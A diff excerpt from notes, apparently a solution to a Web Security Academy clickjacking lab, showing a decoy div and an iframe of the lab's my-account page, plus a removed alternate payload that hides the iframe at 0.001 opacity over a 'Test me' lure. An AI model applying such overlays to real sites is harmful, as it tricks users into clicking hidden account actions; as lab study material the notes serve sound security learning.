@@ -103,23 +103,4 @@ https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account
 <div>Click me</div>
 <iframe src="https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account"></iframe>
 
-# or this:
-
-<style>
-    iframe {
-        position:relative;
-        width: 700px;
-        height: 500px;
-        opacity: 0.001;
-        z-index: 2;
-    }
-    div {
-        position:absolute;
-        top: 300px;
-        left: 60px;
-        z-index: 1;
-    }
-</style>
-<div>Test me</div>
-<iframe src="0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account"></iframe>
 ```
